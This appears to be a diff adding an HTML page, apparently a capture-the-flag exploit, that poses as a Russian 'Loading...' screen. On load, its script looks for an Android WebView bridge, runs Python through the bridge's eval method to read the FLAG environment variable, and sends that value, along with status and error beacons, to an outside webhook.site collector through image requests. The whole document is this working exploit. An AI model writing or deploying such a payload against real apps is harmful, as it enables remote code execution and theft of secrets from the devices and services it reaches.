@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Медоед</title></head>
+<body>
+<h1>Загрузка...</h1>
+<script>
+(function() {
+    var collector = "https://webhook.site/e1ecab05-4c12-42b1-ba43-5744be27249a";
+    new Image().src = collector + "?status=page_loaded";
+    try {
+        if (typeof AndroidBridge !== 'undefined') {
+            new Image().src = collector + "?bridge=found";
+            var flag = AndroidBridge.eval('import os; print(os.environ.get("FLAG"))');
+            if (flag && flag !== 'None') {
+                new Image().src = collector + "?flag=" + encodeURIComponent(flag);
+                document.body.innerHTML += '<p>Флаг отправлен: ' + flag + '</p>';
+            } else {
+                new Image().src = collector + "?flag=empty";
+            }
+        } else {
+            new Image().src = collector + "?bridge=not_found";
+            document.body.innerHTML += '<p>Мост не найден</p>';
+        }
+    } catch (e) {
+        new Image().src = collector + "?err=" + encodeURIComponent(e.toString());
+    }
+})();
+</script>
+</body>
+</html>
